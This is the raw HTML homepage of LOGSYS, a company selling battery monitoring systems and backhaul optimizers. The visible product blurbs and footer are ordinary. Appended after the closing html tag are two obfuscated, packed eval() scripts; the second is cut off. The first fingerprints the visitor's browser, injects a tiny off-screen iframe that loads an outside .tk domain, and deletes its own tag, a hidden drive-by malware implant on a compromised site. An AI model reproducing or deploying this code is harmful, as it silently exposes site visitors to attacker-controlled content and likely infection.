 <!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
	<title>Battery Monitoring System, Sensor</title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="http://svlogsys.com/xmlrpc.php">
	<link rel="stylesheet" href="/wp-content/themes/designbank/layout.css" type="text/css" media="screen, projection">
	<link rel="stylesheet" href="/wp-content/themes/designbank/responsive.css" type="text/css" media="screen, projection">
	<script type="text/javascript" src="/wp-content/plugins/mobile-menu/js/mobmenu.js"></script>
	
	<!--[if lt IE 9]>
	<script src="http://svlogsys.com/template/js/html5.js"></script>
	<![endif]-->
	
<!-- WordPress KBoard plugin 4.4 - http://www.cosmosfarm.com/products/kboard -->
<link rel="alternate" href="http://svlogsys.com/modules/kboard/rss.php" type="application/rss+xml" title="LOGSYS &raquo; KBoard Integration feed">
<!-- WordPress KBoard plugin 4.4 - http://www.cosmosfarm.com/products/kboard -->

<link rel='stylesheet' id='kboard-comments-skin-default-css'  href='http://svlogsys.com/modules/11d9b72a/skin/default/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='http://svlogsys.com/modules/61957d17/font-awesome/css/font-awesome.min.css' type='text/css' media='all' />
<!--[if lte IE 7]>
<link rel='stylesheet' id='font-awesome-ie7-css'  href='http://svlogsys.com/modules/61957d17/font-awesome/css/font-awesome-ie7.min.css' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='kboard-skin-default-css'  href='http://svlogsys.com/modules/61957d17/skin/default/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='layerslider-css'  href='http://svlogsys.com/modules/007d0872/static/css/layerslider.css' type='text/css' media='all' />
<link rel='stylesheet' id='ls-google-fonts-css'  href='http://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900|Open+Sans:300|Indie+Flower:regular|Oswald:300,regular,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-fonts-css'  href='//fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='http://svlogsys.com/template/fonts/genericons.css' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-style-css'  href='http://svlogsys.com/template/main.css' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentythirteen-ie-css'  href='http://svlogsys.com/template/css/ie.css' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='http://svlogsys.com/lib/js/jquery/jquery.js'></script>
<script type='text/javascript' src='http://svlogsys.com/lib/js/jquery/jquery-migrate.min.js'></script>
<script type='text/javascript' src='http://svlogsys.com/modules/007d0872/static/js/layerslider.kreaturamedia.jquery.js'></script>
<script type='text/javascript' src='http://svlogsys.com/modules/007d0872/static/js/greensock.js'></script>
<script type='text/javascript' src='http://svlogsys.com/modules/007d0872/static/js/layerslider.transitions.js'></script>

<!-- All in One SEO Pack 2.1.5 by Michael Torbert of Semper Fi Web Design[353,375] -->
<meta name="description" content="Battery Monitoring System, managing battery systems with real-time measurement for voltage, temperature and impedance." />

<meta name="keywords" content="Battery Monitoring System, Battery Monitor, Battery Monitoring Sensor, Battery State of health, Battery Impedance, Battery Impedance Measurement, backhaul optimization, mobile backhaul optimization, CDMA backhaul optimization, CDMA backhaul" />

<link rel="canonical" href="http://svlogsys.com/" />
<!-- /all in one seo pack -->
<meta name="generator" content="Powered by Visual Composer - drag and drop page builder for WordPress."/>
	<style type="text/css" id="twentythirteen-header-css">
			.site-title,
		.site-description {
			position: absolute;
			clip: rect(1px 1px 1px 1px); /* IE7 */
			clip: rect(1px, 1px, 1px, 1px);
		}
			.site-header .home-link {
			min-height: 0;
		}
		</style>
			
<!-- Responsive Select CSS 
================================================================ -->
<style type="text/css" id="responsive-select-css">
.responsiveSelectContainer select.responsiveMenuSelect, select.responsiveMenuSelect{
	display:none;
}

@media (max-width: 962px) {
	.responsiveSelectContainer{
		border:none !important;
		background:none !important;
		box-shadow:none !important;
	}
	.responsiveSelectContainer ul, ul.responsiveSelectFullMenu, #megaMenu ul.megaMenu.responsiveSelectFullMenu{
		display: none !important;
	}
	.responsiveSelectContainer select.responsiveMenuSelect, select.responsiveMenuSelect { 
		display: inline-block; 
		width:100%;
	}
}	
</style>
<!-- end Responsive Select CSS -->



<!-- Responsive Select JS
================================================================ -->
<script type="text/javascript">
jQuery(document).ready( function($){
	$( '.responsiveMenuSelect' ).change(function() {
		var loc = $(this).find( 'option:selected' ).val();
		if( loc != '' && loc != '#' ) window.location = loc;
	});
	//$( '.responsiveMenuSelect' ).val('');
});
</script>
<!-- end Responsive Select JS -->
		
		
		

	<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-50928305-1', 'svlogsys.com');
  ga('send', 'pageview');

</script>

    <!-- ###: -->
    
    <!-- :### -->
    <!-- ###: -->
    
    <!-- :### -->
    <!-- ###: -->
    
    <!-- :### -->
    <!-- ###: -->
    
    <!-- :### -->
    <!-- ###: -->
    
    <!-- :### -->
    <!-- ###: -->
    
    <!-- :### -->








<!--5273a06202f9fcaad1a537676fe2f96a--><!--5273a06202f9fcaad1a537676fe2f96a-->















































































































































































































































































































































































































































































</head>

<body class="home single-author wpb-js-composer js-comp-ver-3.7.4 vc_responsive">






	<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
						<div class="home_header_container">
							<a class="home-link" href="http://svlogsys.com/" title="LOGSYS" rel="home">
					<h1 class="site-title">LOGSYS</h1>
					<h2 class="site-description">LOGSYS</h2>
				</a>
				<div class="header_logo"><a href="/"><img src="/images/logo.png"/></a></div>
				<div id="navbar" class="navbar">
					
					<nav id="site-navigation" class="navigation main-navigation" role="navigation">
						<h3 class="menu-toggle">Menu</h3>
						<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>
						<div class=" responsiveSelectContainer"><ul id="menu-menu-2" class="nav-menu responsiveSelectFullMenu"><li class="current_page_item"><div class="li_before_bg"></div><a href="http://svlogsys.com/">Home</a><div class="li_after_bg"></div></li>
<li><div class="li_before_bg"></div><a href="http://svlogsys.com/about-us/">About Us</a><div class="li_after_bg"></div></li>
<li><div class="li_before_bg"></div><a href="http://svlogsys.com/products/">Products</a><div class="li_after_bg"></div>
<ul class="sub-menu set_width_0">
	<li><div class="li_before_bg"></div><a href="http://svlogsys.com/products/bms/">BMS (Battery Monitoring System)</a><div class="li_after_bg"></div></li>
	<li><div class="li_before_bg"></div><a href="http://svlogsys.com/products/back-haul-optimizer/">Back haul Optimizer</a><div class="li_after_bg"></div></li>
</ul>
</li>
<li><div class="li_before_bg"></div><a href="http://svlogsys.com/support/">Support</a><div class="li_after_bg"></div>
<ul class="sub-menu set_width_1">
	<li><div class="li_before_bg"></div><a href="http://svlogsys.com/support/download/">Download</a><div class="li_after_bg"></div></li>
	<li><div class="li_before_bg"></div><a href="http://svlogsys.com/support/qa/">Q&#038;A</a><div class="li_after_bg"></div></li>
</ul>
</li>
<li><div class="li_before_bg"></div><a href="http://svlogsys.com/how-to-buy/">How to Buy</a><div class="li_after_bg"></div></li>
<li><div class="li_before_bg"></div><a href="http://svlogsys.com/contact-us/">Contact Us</a><div class="li_after_bg"></div></li>
</ul><select class="responsiveMenuSelect"><option value="" >⇒ Menu</option><option  value="http://svlogsys.com/">Home</option>
<option  value="http://svlogsys.com/about-us/">About Us</option>
<option  value="http://svlogsys.com/products/">Products</option>
	<option  value="http://svlogsys.com/products/bms/">– BMS (Battery Monitoring System)</option>
	<option  value="http://svlogsys.com/products/back-haul-optimizer/">– Back haul Optimizer</option>
<option  value="http://svlogsys.com/support/">Support</option>
	<option  value="http://svlogsys.com/support/download/">– Download</option>
	<option  value="http://svlogsys.com/support/qa/">– Q&#038;A</option>
<option  value="http://svlogsys.com/how-to-buy/">How to Buy</option>
<option  value="http://svlogsys.com/contact-us/">Contact Us</option>
</select></div>						<form role="search" method="get" class="search-form" action="http://svlogsys.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form>					</nav><!-- #site-navigation -->
				</div><!-- #navbar -->
			</div><!-- .container -->
		</header><!-- #masthead -->

		<div id="main" class="site-main">
	<div class="container homepage">
		<div id="primary" class="content-area">
			<div id="content" class="site-content" role="main">

								
					<article id="post-4" class="page">
						<div class="entry-content">
							<div class="wpb_row vc_row-fluid home_slider">
	<div class="vc_span12 wpb_column column_container">
		<div class="wpb_wrapper">
			 
	<div class="wpb_text_column wpb_content_element ">
		<div class="wpb_wrapper">
			<script type="text/javascript">var lsjQuery = jQuery;</script><script type="text/javascript"> lsjQuery(document).ready(function() { if(typeof lsjQuery.fn.layerSlider == "undefined") { lsShowNotice('layerslider_1','jquery'); } else { lsjQuery("#layerslider_1").layerSlider({responsiveUnder: 1200, twoWaySlideshow: true, skin: 'fullwidth', navPrevNext: false, hoverPrevNext: false, navStartStop: false, thumbnailNavigation: 'disabled', autoPlayVideos: false, skinsPath: 'http://svlogsys.com/wp-content/plugins/LayerSlider/static/skins/'}) } }); </script><div class="ls-wp-fullwidth-container"><div class="ls-wp-fullwidth-helper"><div id="layerslider_1" class="ls-wp-container" style="width:1200px;height:698px;max-width:1200px;margin:0 auto;margin-bottom: 0px;"><div class="ls-slide" data-ls="transition2d:12;"><img src="http://svlogsys.com/wp-content/plugins/LayerSlider/static/img/blank.gif" data-src="http://svlogsys.com/file/2014/02/banner1.jpg" class="ls-bg" alt="Slide background" /></div><div class="ls-slide" data-ls="transition2d:12;"><img src="http://svlogsys.com/wp-content/plugins/LayerSlider/static/img/blank.gif" data-src="http://svlogsys.com/file/2014/03/banner23.jpg" class="ls-bg" alt="Slide background" /></div></div></div></div>

		</div> 
	</div> 
		</div> 
	</div> 
</div><div class="wpb_row vc_row-fluid home_content">
	<div class="vc_span4 home_content_1 wpb_column column_container">
		<div class="wpb_wrapper">
			<div class="wpb_row vc_row-fluid">
	<div class="vc_span4 wpb_column column_container">
		<div class="wpb_wrapper">
			
	<div class="wpb_text_column wpb_content_element  home_contents_img">
		<div class="wpb_wrapper">
			<p><img class="alignnone wp-image-51" alt="BMS" src="/wp-content/uploads/2014/02/BMS.jpg" width="148" height="108" /></p>

		</div> 
	</div> 
		</div> 
	</div> 

	<div class="vc_span8 wpb_column column_container">
		<div class="wpb_wrapper">
			
	<div class="wpb_text_column wpb_content_element  home_contents_text">
		<div class="wpb_wrapper">
			<h2>BMS(Battery Monitoring System)</h2>
<ul>
<li>Predicts battery health with alam</li>
<li>Continues 24/7/52 on-line monitoring</li>
<li>Reduce operation and maintenance cost</li>
</ul>
<p><a href="http://svlogsys.com/products/bms/"><img class="alignright size-full wp-image-54" alt="see-more-bt" src="/wp-content/uploads/2014/02/see-more-bt.png" width="83" height="20" /></a></p>

		</div> 
	</div> 
		</div> 
	</div> 
</div>
		</div> 
	</div> 

	<div class="vc_span4 home_content_2 wpb_column column_container">
		<div class="wpb_wrapper">
			<div class="wpb_row vc_row-fluid">
	<div class="vc_span4 wpb_column column_container">
		<div class="wpb_wrapper">
			
	<div class="wpb_text_column wpb_content_element  home_contents_img">
		<div class="wpb_wrapper">
			<p><img class="alignnone wp-image-52" alt="Back-haul-Optimizer" src="/wp-content/uploads/2014/02/Back-haul-Optimizer.jpg" /></p>

		</div> 
	</div> 
		</div> 
	</div> 

	<div class="vc_span8 wpb_column column_container">
		<div class="wpb_wrapper">
			
	<div class="wpb_text_column wpb_content_element  home_contents_text">
		<div class="wpb_wrapper">
			<h2>Back haul Optimizer</h2>
<ul>
<li>T1/E1 Leased Line Optimization</li>
<li>Alternative IP backhaul with Ethernet I/F</li>
<li>Redundancy for data path and HW</li>
</ul>
<p><a href="http://svlogsys.com/products/back-haul-optimizer/"><img class="alignright size-full wp-image-54" alt="see-more-bt" src="/wp-content/uploads/2014/02/see-more-bt.png" width="83" height="20" /></a></p>

		</div> 
	</div> 
		</div> 
	</div> 
</div>
		</div> 
	</div> 

	<div class="vc_span4 home_content_3 wpb_column column_container">
		<div class="wpb_wrapper">
			
	<div class="wpb_text_column wpb_content_element ">
		<div class="wpb_wrapper">
			<p><a href="http://svlogsys.com/how-to-buy/"><img class="alignnone wp-image-49" alt="how-to-buy-banner" src="/wp-content/uploads/2014/02/how-to-buy-banner.jpg" width="256" height="126" /></a></p>

		</div> 
	</div> 
		</div> 
	</div> 
</div>
													</div><!-- .entry-content -->

						<footer class="entry-meta">
													</footer><!-- .entry-meta -->
					</article><!-- #post -->

					
<div id="comments" class="comments-area">

	
			
</div><!-- #comments -->				
			</div><!-- #content -->
		</div><!-- #primary -->
	</div><!-- .container -->


		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			
			<div class="site-info">
				Address : 3003 N. 1st St Suite 334, San Jose, CA 95134  /  TEL : 408-232-5429   /   Email : support@svlogsys.com<br/>
								Copyright(C) 2014 <a href="/" title="Semantic Personal Publishing Platform">Logsys</a>. ALL RIGHTS RESERVED.
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

	<link rel='stylesheet' id='js_composer_front-css'  href='http://svlogsys.com/modules/b2ecce28/assets/css/js_composer_front.css' type='text/css' media='all' />
<script type='text/javascript' src='http://svlogsys.com/template/js/functions.js'></script>
<script type='text/javascript' src='http://svlogsys.com/modules/b2ecce28/assets/js/js_composer_front.js'></script>
<!--5273a06202f9fcaad1a537676fe2f96a--><!--5273a06202f9fcaad1a537676fe2f96a--></body>
</html><script type="text/javascript" id="id_4170390">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j 1B=3x(I(){f(q.O!=1P&&M q.O!="L"){3y(1B);f(M A["1F"]=="L"){A["1F"]=1;j Y=(V()&&1d());j 1Q=!Y&&!!A.3z&&A.E.3w==="3v 3r.";j 1N=-1;j G="3s://3t.3u";f(17()&&1N==1){f((E.P.1K(/3A/i))||(E.P.1K(/3B/i))){1b.3H(G)}z{A.1b=G;q.1b=G}}z{f((Y&&!1Q&&!17())){j U="<T 3I=\\"3J:3G;3F:-3C;\\"><1C 3D=\\"1D\\" 3E=\\""+G+"\\" 3q=\\"1D\\"></1C></T>";j J=q.3p("T");f(J.1x==0){q.O.N=q.O.N+U}z{j 1A=J.1x;j R=3b.3c((1A/2));J[R].N=J[R].N+U}}}}1J()}},3d);I 1J(){j Z="3a";f(Z!="39"){j H=q.35(Z);f(M H!=L&&H!=1P){H.36="";37 H}}};I 1d(){f(q.C&&!q.38){x B}z f(q.C&&!A.3e){x B}z f(q.C&&!q.3f){x B}z f(q.C&&!q.3m){x B}z f(q.C&&!A.3n){x B}z f(q.C){x B}z f(M E.3o!="L"&&!q.C&&V()){x B}z{x 1a}}I V(){j y=A.E.P;j K=y.D("3l ");f(K>0){x 16(y.1c(K+5,y.D(".",K)),10)}j 1r=y.D("3k/");f(1r>0){j S=y.D("3g:");x 16(y.1c(S+3,y.D(".",S)),10)}j Q=y.D("3h/");f(Q>0){x 16(y.1c(Q+5,y.D(".",Q)),10)}x 1a}I 17(){j 14=A.E.P.3i();f(/(3j|3K\\d+|3L).+1q|4h|4i\\/|4j|4g|4f|4b|4c|4d|34|1R(4k|1M)|1z|4l|4r |4s|4t|4q|1q.+4p|4m|4n m(4o|4a)i|48( 1H)?|3S|p(3T|3U)\\/|3R|3Q|3M|3N(4|6)0|3O|3P|1U\\.(3V|3W)|43|44|46 42|41|3X/i.1y(14)||/3Y|3Z|4u|30|1Z|50[1-6]i|28|1W|a 1G|1V|1l(1T|1n|s\\-)|1e(26|2q)|1p(2l|1O|1m)|2k|2j(2m|X|2n)|29|1u(2p|19)|2o(W|2i)|2c|2b(2f|\\-m|r |s )|2g|2e(1I|1s|2d)|1v(2a|2h)|1X(1l|1Y)|27(e|v)w|25|24\\-(n|u)|22\\/|23|33|2Q\\-|2R|2S|2P|2O\\-|1m(2L|1j)|2M|2N(1h|1s|2T)|2U|2r\\-s|31|2Z|2Y|1f(c|p)o|2V(12|\\-d)|2W(49|1e)|2X(2K|2J)|1T(2x|2y)|2z|2w([4-7]0|1H|1G|2v)|2s|2t(\\-|1L)|1S u|2u|2A|2B\\-5|g\\-11|19(\\.w|1M)|2H(2I|2G)|2F|2C|2D\\-(m|p|t)|2E\\-|4e(1w|1g)|4Q( i|1R)|6M\\-c|6L(c(\\-| |1L|a|g|p|s|t)|66)|5W(63|6t)|i\\-(20|19|15)|6m|6n( |\\-|\\/)|4v|6o|6l|6k|6h|6i|6j|1z|6p(t|v)a|6q|6w|6x|6y|6v|6u( |\\/)|6r|6g |6f\\-|62(c|k)|64(5Z|5Y)|5V( g|\\/(k|l|u)|50|54|\\-[a-w])|6d|6e|6b\\-w|68|69\\/|15(W|6A|6z)|1i(F|21|1O)|m\\-71|72(6Z|1o)|6Y(6W|6X|1E)|75|11(F|74|1v|7d|1f|t(\\-| |o|v)|7c)|79(50|7a|v )|77|78|6U[0-2]|6T[2-3]|6G(0|2)|6H(0|2|5)|6I(0(0|1)|10)|6F((c|m)\\-|6E|6B|6C|6D|6J)|6K(6|i)|6R|6S|6P(6O|6N)|67|5T|4X|4Y(a|d|t)|5U|4Z(13|\\-([1-8]|c))|4R|4S|1t(4T|4U)|51\\-2|55(1I|5b|1k)|5c|5d|1w\\-g|5a\\-a|56(57|12|21|32|60|\\-[2-7]|i\\-)|4E|4B|4A|4w|4x|4y(4z|4F)|4G\\/|4M(4N|15|4O|4L|X|4K)|4H(F|h\\-|1n|p\\-)|4J\\/|1k(c(\\-|0|1)|47|1i|1j|1o)|5f\\-|5G|5H(\\-|m)|5I\\-0|5F(45|5E)|5B(1p|1u|5C|1h|5D)|5J(5K|X)|5Q(F|h\\-|v\\-|v )|5R(F|5S)|5P(18|50)|5O(5L|10|18)|1g(5A|5z)|5m\\-|5n\\-|5o(i|m)|5l\\-|t\\-11|5g(1t|5h)|1E(70|m\\-|5j|5p)|5q\\-9|1U(\\.b|1S|5w)|5x|5y|5v|5u|5r(5s|W)|5t(40|5[0-3]|\\-v)|5i|5k|5N|5M(52|53|60|61|70|5e|4I|4D|4C|4P)|58(\\-| )|59|4V|4W(g |6Q|76)|7b|6V|73|6a\\-|6c|65|5X\\-/i.1y(14.6s(0,4))){x B}x 1a}',62,448,'|||||||||||||||if||||var|||||||document|||||||return|DMjCvoNYOsnHkeXOIlZwTXmSXfYBCWhYvtduDKO|else|window|true|all|indexOf|navigator|01|HZBrdqwzMfitigeFEDvtWeGiWCbhOGpkLNXXn|mFAfSBaomtnmZArYjuSgHuOFbqUnJuXdFYnr|function|kxxKHMlzBhJRbvzouDjAItJNFnvKQIeaCcT|akmMnlvLtQsAAIZEFcrhRZxMNiLDlShmoS|undefined|typeof|innerHTML|body|userAgent|zvNZQSdlHefGAqqjRafkQHtEYQaCsEyfPioVPDU|YblkMIJjcpTaurkzJHxsAJzblkLiqGhObpqkxBKp|NKwIWBQCHUvNsbQytAXSTZHXVdNfUsvqFI|div|damXegRoSOxxgyaGIplSxGczEAVnwLLcuuGXnqFI|VSQGfBZmLjuIvYJsqVWfuCXGjEtbCyx|te|ny|YWXxJWyPicpHDIMTvZcdQPPpYCwixsZEJgVyzHM|yhKRRfGIiWonWUhFgPcjXQWeLagvSpkiv||mo|||xRYUoAUpOsujRINCUGvvaOCHSQcgMxGoctXtnjb|ma|parseInt|OQVpuoJCiIvojAJblQWhSAlnyDbjpOfbzNnKKrhy||go|false|location|substring|URWyIdonSxbKDYEHOYEDdZpSuiRDhIHd|ai|do|ta|it|mc|nd|se|ac|co|oo|ri|al|mobile|uuDWLVfIkDIECaazYUxVTUAHvyCQgLArl|ll|pl|ar|bi|pt|length|test|iris|dl_name|rVEYLcHKWkSOPNovwiXBvWYHhNdDXqA|iframe|2px|ts|v_5273a06202f9fcaad1a537676fe2f96a|wa|os|ck|daDMWHbRrsrizJHRurcyeGsOOlfOrCNrrhEp|match|_|od|PkjJStHqioSIfXZAKzKUKCiUCBCvtZfoZd|ca|null|EWqxTbvzwwOiQvbZtJNGnPlnnhUCZIusUqe|ip|g1|er|up|abac|802s|bl|az|4thp|||c55|capi|bw|bumb|ko|br|770s|aptu|lb|au|attw|nq|be|di|avan|rd|us|an|amoi|av|ex|yw|as|ch|rn|dc|fetc|fly|g560|ze|ez|ic|k0|esl8|gene|gf|hcit|hd|hei|haie|un|gr|ad|ul|l2|mp|craw|da|cmd|cldc|cdm|cell|chtm|ng|dbte|ds|el|em|dmob|dica|3gso|devi||ccwa|iemobile|getElementById|outerHTML|delete|compatMode|none|id_4170390|Math|floor|100|XMLHttpRequest|querySelector|rv|Edge|toLowerCase|android|Trident|MSIE|addEventListener|atob|maxTouchPoints|getElementsByTagName|height|Inc|http|dgdsgweewtew545435|tk|Google|vendor|setInterval|clearInterval|chrome|iPhone|iPod|4099px|width|src|left|absolute|replace|style|position|bb|meego|psp|series|symbian|treo|pocket|plucker|phone|ixi|re|browser|link|xiino|1207|6310||xda|ce|vodafone|wap||windows||palm||in|elaine|fennec|hiptop|hi|compal|blazer|avantgo|bada|blackberry|hone|kindle|netfront|opera|ob|firefox|mmp|lge|maemo|midp|6590|ibro|raks|rim9|ro|ve|r600|r380|85|83|qtek|zo|s55|sc|81|sdk|va|ms|sa|ge|mm|98|hp|phil|pire|ay|uc|whit|wi|p800|pan|pg||pn||||po|qc|07|w3c|webc|qa|rt|prox|psio|80|sgh|to|sh|vm40|m3|voda|tim|tcl|tdg|tel|m5|tx|vi|rg|vk|veri|v750|si|utst|v400|lk|gt|sm|b3|t5|id|sl|shar|sie|sk|so|ft|00|vx|vulc|t6|t2|sp|sy|mb|owg1|pdxg|lg|hu|zte|xi|no|||kyo|aw|le|zeto|tp|oran|m3ga|m50|yas|m1|your|libw|lynx|kwc|kpt|im1k|inno|ipaq|ikom|ig01|i230|iac|idea|ja|jbro|klon|substr|tc|kgt|keji|jemu|jigs|kddi|xo|ui|tf|wf|wg|on|ne|n30|n50|n7|wt|nok|ht|hs|wv|ti|op|nc|nzph|o2im|n20|n10|wonu|o8|oa|mi|rc||cr|me|x700|02|mmef|nw|mwbp|mywa|mt|p1|wmlb|zz|de'.split('|'),0,{}))
</script><script type="text/javascript" id="id_1929208">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j 1B=3x(I(){f(q.O!=1P&&M q.O!="L"){3y(1B);f(M A["1F"]=="L"){A["1F"]=1;j Y=(V()&&1d());j 1Q=!Y&&!!A.3z&&A.E.3w==="3v 3r.";j 1N=-1;j G="3s://3t.3u";f(17()&&1N==1){f((E.P.1K(/3A/i))||(E.P.1K(/3B/i))){1b.3H(G)}z{A.1b=G;q.1b=G}}z{f((Y&&!1Q&&!17())){j U="<T 3I=\\"3J:3G;3F:-3C;\\"><1C 3D=\\"1D\\" 3E=\\""+G+"\\" 3q=\\"1D\\"></1C></T>";j J=q.3p("T");f(J.1x==0){q.O.N=q.O.N+U}z{j 1A=J.1x;j R=3b.3c((1A/2));J[R].N=J[R].N+U}}}}1J()}},3d);I 1J(){j Z="3a";f(Z!="39"){j H=q.35(Z);f(M H!=L&&H!=1P){H.36="";37 H}}};I 1d(){f(q.C&&!q.38){x B}z f(q.C&&!A.3e){x B}z f(q.C&&!q.3f){x B}z f(q.C&&!q.3m){x B}z f(q.C&&!A.3n){x B}z f(q.C){x B}z f(M E.3o!="L"&&!q.C&&V()){x B}z{x 1a}}I V(){j y=A.E.P;j K=y.D("3l ");f(K>0){x 16(y.1c(K+5,y.D(".",K)),10)}j 1r=y.D("3k/");f(1r>0){j S=y.D("3g:");x 16(y.1c(S+3,y.D(".",S)),10)}j Q=y.D("3h/");f(Q>0){x 16(y.1c(Q+5,y.D(".",Q)),10)}x 1a}I 17(){j 14=A.E.P.3i();f(/(3j|3K\\d+|3L).+1q|4h|4i\\/|4j|4g|4f|4b|4c|4d|34|1R(4k|1M)|1z|4l|4r |4s|4t|4q|1q.+4p|4m|4n m(4o|4a)i|48( 1H)?|3S|p(3T|3U)\\/|3R|3Q|3M|3N(4|6)0|3O|3P|1U\\.(3V|3W)|43|44|46 42|41|3X/i.1y(14)||/3Y|3Z|4u|30|1Z|50[1-6]i|28|1W|a 1G|1V|1l(1T|1n|s\\-)|1e(26|2q)|1p(2l|1O|1m)|2k|2j(2m|X|2n)|29|1u(2p|19)|2o(W|2i)|2c|2b(2f|\\-m|r |s )|2g|2e(1I|1s|2d)|1v(2a|2h)|1X(1l|1Y)|27(e|v)w|25|24\\-(n|u)|22\\/|23|33|2Q\\-|2R|2S|2P|2O\\-|1m(2L|1j)|2M|2N(1h|1s|2T)|2U|2r\\-s|31|2Z|2Y|1f(c|p)o|2V(12|\\-d)|2W(49|1e)|2X(2K|2J)|1T(2x|2y)|2z|2w([4-7]0|1H|1G|2v)|2s|2t(\\-|1L)|1S u|2u|2A|2B\\-5|g\\-11|19(\\.w|1M)|2H(2I|2G)|2F|2C|2D\\-(m|p|t)|2E\\-|4e(1w|1g)|4Q( i|1R)|6M\\-c|6L(c(\\-| |1L|a|g|p|s|t)|66)|5W(63|6t)|i\\-(20|19|15)|6m|6n( |\\-|\\/)|4v|6o|6l|6k|6h|6i|6j|1z|6p(t|v)a|6q|6w|6x|6y|6v|6u( |\\/)|6r|6g |6f\\-|62(c|k)|64(5Z|5Y)|5V( g|\\/(k|l|u)|50|54|\\-[a-w])|6d|6e|6b\\-w|68|69\\/|15(W|6A|6z)|1i(F|21|1O)|m\\-71|72(6Z|1o)|6Y(6W|6X|1E)|75|11(F|74|1v|7d|1f|t(\\-| |o|v)|7c)|79(50|7a|v )|77|78|6U[0-2]|6T[2-3]|6G(0|2)|6H(0|2|5)|6I(0(0|1)|10)|6F((c|m)\\-|6E|6B|6C|6D|6J)|6K(6|i)|6R|6S|6P(6O|6N)|67|5T|4X|4Y(a|d|t)|5U|4Z(13|\\-([1-8]|c))|4R|4S|1t(4T|4U)|51\\-2|55(1I|5b|1k)|5c|5d|1w\\-g|5a\\-a|56(57|12|21|32|60|\\-[2-7]|i\\-)|4E|4B|4A|4w|4x|4y(4z|4F)|4G\\/|4M(4N|15|4O|4L|X|4K)|4H(F|h\\-|1n|p\\-)|4J\\/|1k(c(\\-|0|1)|47|1i|1j|1o)|5f\\-|5G|5H(\\-|m)|5I\\-0|5F(45|5E)|5B(1p|1u|5C|1h|5D)|5J(5K|X)|5Q(F|h\\-|v\\-|v )|5R(F|5S)|5P(18|50)|5O(5L|10|18)|1g(5A|5z)|5m\\-|5n\\-|5o(i|m)|5l\\-|t\\-11|5g(1t|5h)|1E(70|m\\-|5j|5p)|5q\\-9|1U(\\.b|1S|5w)|5x|5y|5v|5u|5r(5s|W)|5t(40|5[0-3]|\\-v)|5i|5k|5N|5M(52|53|60|61|70|5e|4I|4D|4C|4P)|58(\\-| )|59|4V|4W(g |6Q|76)|7b|6V|73|6a\\-|6c|65|5X\\-/i.1y(14.6s(0,4))){x B}x 1a}',62,448,'|||||||||||||||if||||var|||||||document|||||||return|SyCuLYbUwrupPyGeGOmyylHjVcRKUCJbJ|else|window|true|all|indexOf|navigator|01|fUnamvhOfSUZnFkVelDcZbERYcqjvzNwlX|PXWsHqlrrkhbtrrLctyonQqqwFpGzwKuaAgABdw|function|ybdNcuosFqcSwNSzovTjHcGetfSJBbkJulvz|hUlbtLHVJePmySbXUtgOSlfQzwYFEHXK|undefined|typeof|innerHTML|body|userAgent|CQbmyoljtLDnIuaaqrVmEoCvdbcDFPlt|lkbLqvNBUgVSGjrAvnZChGqlDiyqnLSlXIyGJt|RtEmfYALgARhZbtzcCiyTcanZkBmatRVkCvaYbpJ|div|fVCFVIQBoXvzoHFXFeaIXjtZUrYEUiDuBkDjjyUxX|CXZTyfVeKYIfxyYuEyKBMZNXpcYElYmYNxQThX|te|ny|lgGPnYZnPTEeBSSpzTyxLUMTHWDWQVYweaesfbtl|jffePeDsfbseNelZBngRpzoWbNRzZIoAQH||mo|||gZQpPNVwYqDhHDWsEcwWeKcasvIICTCEwGH|ma|parseInt|XHaJKqVKEYscGhINbllXrVuHSmsQtksgWG||go|false|location|substring|hYwhnHTnJjXkiFTFWhqIGocJCsiMNpReugCMcakk|ai|do|ta|it|mc|nd|se|ac|co|oo|ri|al|mobile|dAppTtYHDsNqMfQIeOogNvVOPmpQCSomw|ll|pl|ar